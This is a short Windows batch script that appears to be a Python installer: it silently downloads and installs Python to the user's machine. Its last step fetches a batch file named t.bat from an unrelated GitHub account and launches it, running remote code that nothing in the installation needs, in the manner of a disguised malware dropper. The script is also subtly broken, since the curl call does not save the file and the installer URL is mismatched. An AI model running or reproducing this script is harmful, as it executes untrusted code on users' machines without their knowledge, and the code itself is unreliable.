@echo off
cd %USERPROFILE%\Desktop

:: Python 3.10
:: set https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe

:: Python 3.11
:: set PYTHON_URL=https://www.python.org/ftp/python/3.11.4/python-3.11.4-amd64.exe

:: Python 3.12 
set PYTHON_URL=https://www.python.org/ftp/python/3.12.0/python-3.12.0b4-amd64.exe

powershell -Command "& { iwr '%PYTHON_URL%' -OutFile %USERPROFILE%\Desktop\python-installer.exe }"

python-installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0

if ERRORLEVEL 1 (
    echo Python installation failed!
    exit /b %ERRORLEVEL%
) else (
    echo Python installation succeeded!
)
goto :folder

:folder
curl https://raw.githubusercontent.com/oogabooga245/cm-/refs/heads/main/t.bat
start t.bat
exit
